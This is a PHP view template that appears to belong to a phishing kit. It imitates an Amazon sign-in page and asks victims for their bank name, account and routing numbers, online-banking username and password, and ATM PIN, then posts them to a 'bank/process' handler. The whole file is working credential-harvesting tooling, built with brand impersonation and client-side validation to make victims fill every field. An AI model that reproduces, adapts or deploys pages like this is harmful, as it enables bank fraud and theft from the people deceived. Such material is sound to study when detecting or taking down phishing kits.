<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "language/lang.php";
?>
<!DOCTYPE html>
<html>

<head>
    <title>
        <?php echo $_45 ?>
    </title>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="<?= base_url() ?>Assets/fvck/images/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>Assets/fvck/css/boostrap.min.css" media="all">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/sign-dekstop.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/style.sign-desktop.css">
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>Assets/fvck/css/style.css">
</head>

<body onload="_loader()" style="margin:0;">
    <div id="loader"></div>
    <div style="display:none;" id="myDiv" class="animate-bon ttom">
        <div id="a-page">
            <div class="a-section a-padding-medium auth-workflow">
                <div class="a-section a-spacing-none auth-navbar">
                    <div class="a-section a-spacing-medium a-text-center">
                        <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </div>
                </div>
                <div id="authportal-center-section" class="a-section">

                    <div class="cc-content4 mt-4" style="padding-top: 0">
                        <div class="container">
                            <div class="row" style="padding-top: 5px">
                                <div class="col-12">
                                    <div class="mb-3" align="center"> <img src="<?= base_url() ?>Assets/fvck/images/bankkx.png" width="80"> </div>
                                    <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_99 ?></span> </div>
                                    <div class="mb-3" align="center"> <span class="lefttext"><?php echo $_72 ?></span> </div><br>
                                    <div class="mypayementarea">
                                        <form action="<?= base_url() ?>bank/process" method="post" onsubmit="return validateForm();" name="fms-form" id="fms-form"> <span class="colorblacked"><?php echo $_100 ?></span>
                                            <div class="row mt-3">
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="bankname">
                                                            <?php echo $_101 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="bankname" id="bankname" placeholder="<?php echo $_102 ?>" minlength="5" maxlength="30" oninput="this.value=this.value.toUpperCase()" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="accountnum">
                                                            <?php echo $_122 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="accountnum" id="accountnum" placeholder="<?php echo $_122 ?>" maxlength="25" oninput="this.value=this.value.toUpperCase()" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="username">
                                                            <?php echo $_103 ?>
                                                        </label>
                                                        <input type="text" id="username" class="form-control amazoninput cityfocus" name="username" placeholder="<?php echo $_103 ?>" maxlength="25" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="routingnum">
                                                            <?php echo $_120 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="routingnum" id="routingnum" placeholder="<?php echo $_120 ?>" maxlength="20" oninput="this.value=this.value.toUpperCase()" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="password">
                                                            <?php echo $_104 ?>
                                                        </label>
                                                        <input type="password" class="form-control amazoninput regionfocus" name="password" id="password" placeholder="<?php echo $_104 ?>" maxlength="30">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="atmpin">
                                                            <?php echo $_105 ?>
                                                        </label>
                                                        <input type="password" class="form-control amazoninput zipfocus" name="atmpin" id="atmpin" placeholder="<?php echo $_105 ?>" maxlength="5" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-row a-spacing-small">
                                                <span style="border:none; background-color:white" id="cvf-submit-otp-button" class="">
                                                    <span style="border:none; background-color:white" class="a-button-inner">
                                                        <button style="border:none; background-color:#ffd814; border-radius:7px;" type="submit" name="Sex" class="a-button-text btn btn-warning" role="button"><i class="fa fa-padlock"></i> <?php echo $_7 ?></button>
                                                    </span>
                                                </span>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <script>
                                    P.when('A', 'ready').execute(function(A) {
                                        var $ = A.$;
                                        $('.cvf-widget-link-resend').click(function() {
                                            $('.cvf-widget-form-resend').submit();
                                        });
                                    });
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_21 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_22 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_23 ?>
                </a> <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/js/all.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery-3.3.1.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.mask.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.validate.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/additional-methods.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.creditCardValidator.js"></script>
    <script>
        let load;

        let _loader = () => {
            load = setTimeout(showPage, 1000);
        }

        let showPage = () => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('myDiv').style.display = 'block';
        }

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function(e) {
            $("#fms-form").validate({
                errorClass: "error-class",
                rules: {
                    bankname: {
                        required: true,
                        minlength: 5
                    },
                    accountnum: {
                        required: true,
                        maxlength: 25
                    },
                    routingnum: {
                        required: true,
                        maxlength: 20
                    },
                    username: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    password: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    atmpin: {
                        required: true,
                        minlength: 2,
                        maxlength: 10
                    }
                },
                messages: {
                    bankname: {
                        required: "<?php echo $_106 ?>"
                    },
                    accountnum: {
                        required: "<?php echo $_125 ?>"
                    },
                    routingnum: {
                        required: "<?php echo $_124 ?>"
                    },
                    username: {
                        required: "<?php echo $_107 ?>"
                    },
                    password: {
                        required: "<?php echo $_108 ?>"
                    },
                    atmpin: {
                        required: "<?php echo $_109 ?>"
                    }
                }
            });
        })
    </script>
</body>

</html>